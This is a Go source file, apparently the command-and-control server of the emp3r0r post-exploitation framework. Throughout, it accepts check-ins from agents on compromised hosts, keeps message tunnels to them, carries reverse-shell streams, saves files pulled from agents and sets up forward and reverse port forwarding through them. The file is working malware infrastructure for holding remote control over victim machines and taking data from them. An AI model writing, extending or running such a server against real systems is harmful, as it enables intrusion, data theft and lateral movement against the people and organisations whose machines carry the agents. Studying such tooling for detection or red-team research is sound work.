package cc

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// StreamHandler allow the http handler to use H2Conn
type StreamHandler struct {
	H2x     *emp3r0r_data.H2Conn // h2conn with context
	Buf     chan []byte          // buffer for receiving data
	Token   string               // token string, for agent auth
	BufSize int                  // buffer size for reverse shell should be 1
}

var (
	// RShellStream reverse shell handler
	RShellStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.RShellBufSize, Buf: make(chan []byte)}

	// ProxyStream proxy handler
	ProxyStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.ProxyBufSize, Buf: make(chan []byte)}

	// FTPStreams file transfer handlers
	FTPStreams = make(map[string]*StreamHandler)

	// FTPMutex lock
	FTPMutex = &sync.Mutex{}

	// RShellStreams rshell handlers
	RShellStreams = make(map[string]*StreamHandler)

	// RShellMutex lock
	RShellMutex = &sync.Mutex{}

	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
	PortFwds = make(map[string]*PortFwdSession)

	// PortFwdsMutex lock
	PortFwdsMutex = &sync.Mutex{}
)

// ftpHandler handles buffered data
func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) {
	// check if an agent is already connected
	if sh.H2x.Ctx != nil ||
		sh.H2x.Cancel != nil ||
		sh.H2x.Conn != nil {
		CliPrintError("ftpHandler: occupied")
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	var err error
	sh.H2x = &emp3r0r_data.H2Conn{}
	// use h2conn
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("ftpHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	// agent auth
	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
	// token from URL
	vars := mux.Vars(req)
	token := vars["token"]
	if token != sh.Token {
		CliPrintError("Invalid ftp token '%s vs %s'", token, sh.Token)
		return
	}
	CliPrintInfo("Got a ftp connection (%s) from %s", sh.Token, req.RemoteAddr)

	// save the file
	filename := ""
	for fname, persh := range FTPStreams {
		if sh.Token == persh.Token {
			filename = fname
			break
		}
	}
	// abort if we dont have the filename
	if filename == "" {
		CliPrintError("%s failed to parse filename", sh.Token)
		return
	}
	filename = util.FileBaseName(filename) // we dont want the full path
	filewrite := FileGetDir + filename + ".downloading"
	lock := FileGetDir + filename + ".lock"
	// is the file already being downloaded?
	if util.IsFileExist(lock) {
		CliPrintError("%s is already being downloaded", filename)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	// create lock file
	_, err = os.Create(lock)

	// FileGetDir
	if !util.IsFileExist(FileGetDir) {
		err = os.MkdirAll(FileGetDir, 0700)
		if err != nil {
			CliPrintError("mkdir -p %s: %v", FileGetDir, err)
			return
		}
	}
	defer func() {
		// cleanup
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				CliPrintError("ftpHandler failed to close connection: " + err.Error())
			}
		}
		sh.Token = ""
		sh.H2x.Cancel()
		FTPMutex.Lock()
		delete(FTPStreams, filename)
		FTPMutex.Unlock()
		CliPrintWarning("Closed ftp connection from %s", req.RemoteAddr)

		// delete the lock file, unlock download session
		err = os.Remove(lock)
		if err != nil {
			CliPrintWarning("Remove %s: %v", lock, err)
		}

		// have we finished downloading?
		targetFile := FileGetDir + util.FileBaseName(filename)
		nowSize := util.FileSize(filewrite)
		targetSize := util.FileSize(targetFile)
		if nowSize == targetSize && nowSize >= 0 {
			err = os.Rename(filewrite, targetFile)
			if err != nil {
				CliPrintError("Failed to save downloaded file %s: %v", targetFile, err)
			}
			checksum := tun.SHA256SumFile(targetFile)
			CliPrintSuccess("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
			return
		}
		if nowSize > targetSize {
			CliPrintError("Downloaded (%d of %d bytes), WTF?", nowSize, targetSize)
			return
		}
		CliPrintWarning("Incomplete download (%d of %d bytes), will continue if you run GET again", nowSize, targetSize)
	}()

	// open file for writing
	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		CliPrintError("ftpHandler write file: %v", err)
	}
	defer f.Close()

	// read filedata
	for sh.H2x.Ctx.Err() == nil {
		data := make([]byte, sh.BufSize)
		n, err := sh.H2x.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: ftpHandler read: %v", err)
			return
		}
		if n < sh.BufSize {
			data = data[:n]
		}

		// write the file
		_, err = f.Write(data)
		if err != nil {
			CliPrintError("ftpHandler failed to save file: %v", err)
			return
		}
	}
}

// portFwdHandler handles proxy/port forwarding
func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
	var (
		err error
		h2x emp3r0r_data.H2Conn
	)
	sh.H2x = &h2x
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("portFwdHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel

	// save sh
	shCopy := *sh

	// record this connection to port forwarding map
	if sh.H2x.Conn == nil {
		CliPrintWarning("%s h2 disconnected", sh.Token)
		return
	}

	vars := mux.Vars(req)
	token := vars["token"]
	origToken := token    // in case we need the orignal session-id, for sub-sessions
	isSubSession := false // sub-session is part of a port-mapping, every client connection starts a sub-session (h2conn)
	if strings.Contains(string(token), "_") {
		isSubSession = true
		idstr := strings.Split(string(token), "_")[0]
		token = idstr
	}

	sessionID, err := uuid.Parse(token)
	if err != nil {
		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", token, req.RemoteAddr, err)
		return
	}
	// check if session ID exists in the map,
	pf, exist := PortFwds[sessionID.String()]
	if !exist {
		CliPrintError("Unknown ID: %s", sessionID.String())
		return
	}
	pf.Sh = make(map[string]*StreamHandler)
	if !isSubSession {
		pf.Sh[sessionID.String()] = &shCopy // cache this connection
		// handshake success
		CliPrintDebug("Got a portFwd connection (%s) from %s", sessionID.String(), req.RemoteAddr)
	} else {
		pf.Sh[string(origToken)] = &shCopy // cache this connection
		// handshake success
		if strings.HasSuffix(string(origToken), "-reverse") {
			CliPrintDebug("Got a portFwd (reverse) connection (%s) from %s", string(origToken), req.RemoteAddr)
			err = pf.RunReversedPortFwd(&shCopy) // handle this reverse port mapping request
			if err != nil {
				CliPrintError("RunReversedPortFwd: %v", err)
			}
		} else {
			CliPrintDebug("Got a portFwd sub-connection (%s) from %s", string(origToken), req.RemoteAddr)
		}
	}

	defer func() {
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				CliPrintError("portFwdHandler failed to close connection: " + err.Error())
			}
		}

		// if this connection is just a sub-connection
		// keep the port-mapping, only close h2conn
		if string(origToken) != sessionID.String() {
			cancel()
			CliPrintDebug("portFwdHandler: closed connection %s", origToken)
			return
		}

		// cancel PortFwd context
		pf, exist = PortFwds[sessionID.String()]
		if exist {
			pf.Cancel()
		} else {
			CliPrintWarning("portFwdHandler: cannot find port mapping: %s", sessionID.String())
		}
		// cancel HTTP request context
		cancel()
		CliPrintWarning("portFwdHandler: closed portFwd connection from %s", req.RemoteAddr)
	}()

	for ctx.Err() == nil && pf.Ctx.Err() == nil {
		_, exist = PortFwds[sessionID.String()]
		if !exist {
			CliPrintWarning("Disconnected: portFwdHandler: port mapping not found")
			return
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func dispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)

	var rshellConn, proxyConn emp3r0r_data.H2Conn
	RShellStream.H2x = &rshellConn
	ProxyStream.H2x = &proxyConn

	token := vars["token"]
	api := tun.WebRoot + "/" + vars["api"]
	switch api {
	// Message-based communication
	case tun.CheckInAPI:
		checkinHandler(wrt, req)
	case tun.MsgAPI:
		msgTunHandler(wrt, req)

	// stream based
	case tun.FTPAPI:
		// find handler with token
		for _, sh := range FTPStreams {
			if token == sh.Token {
				sh.ftpHandler(wrt, req)
				return
			}
		}
		wrt.WriteHeader(http.StatusForbidden)
	case tun.ProxyAPI:
		ProxyStream.portFwdHandler(wrt, req)
	default:
		wrt.WriteHeader(http.StatusBadRequest)
	}
}

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.FileAPI); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.FileAPI, 0700)
		if err != nil {
			log.Fatal("TLSServer: ", err)
		}
	}
	r := mux.NewRouter()

	// File server
	r.PathPrefix("/www/").Handler(http.StripPrefix("/www/", http.FileServer(http.Dir(WWWRoot))))
	// handlers
	r.HandleFunc("/emp3r0r/{api}/{token}", dispatcher)

	// use router
	http.Handle("/", r)

	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", emp3r0r_data.CCPort), "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
	if err != nil {
		log.Println(color.RedString("Start HTTPS server: %v", err))
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	var target emp3r0r_data.SystemInfo
	jsonData, err := ioutil.ReadAll(req.Body)
	defer req.Body.Close()
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	err = json.Unmarshal(jsonData, &target)
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	// set target IP
	target.IP = req.RemoteAddr

	if !IsAgentExist(&target) {
		inx := assignTargetIndex()
		Targets[&target] = &Control{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-agent")[0]
		// set labels
		if util.IsFileExist(AgentsJSON) {
			var mutex = &sync.Mutex{}
			if l := SetAgentLabel(&target, mutex); l != "" {
				shortname = l
			}
		}
		CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", inx)
		CliMsg("%s from %s, "+
			"running %s\n",
			shortname, fmt.Sprintf("%s - %s", target.IP, target.Transport),
			strconv.Quote(target.OS))
	}
}

// msgTunHandler JSON message based tunnel between agent and cc
func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("msgTunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	defer func() {
		for t, c := range Targets {
			if c.Conn == conn {
				delete(Targets, t)
				SetDynamicPrompt()
				CliAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
				CliMsg("[%d] agent %s disconnected\n", c.Index, strconv.Quote(t.Tag))
				break
			}
		}
		err = conn.Close()
		if err != nil {
			CliPrintError("msgTunHandler failed to close connection: " + err.Error())
		}
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg emp3r0r_data.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	for {
		// deal with json data from agent
		err = in.Decode(&msg)
		if err != nil {
			return
		}
		// read hello from agent, set its Conn if needed, and hello back
		// close connection if agent is not responsive
		if msg.Payload == "hello" {
			err = out.Encode(msg)
			if err != nil {
				CliPrintWarning("msgTunHandler cannot send hello to agent %s", msg.Tag)
				return
			}
		}

		// process json tundata from agent
		processAgentData(&msg)

		// assign this Conn to a known agent
		agent := GetTargetFromTag(msg.Tag)
		if agent == nil {
			CliPrintWarning("msgTunHandler: agent not recognized")
			return
		}
		Targets[agent].Conn = conn

	}
}
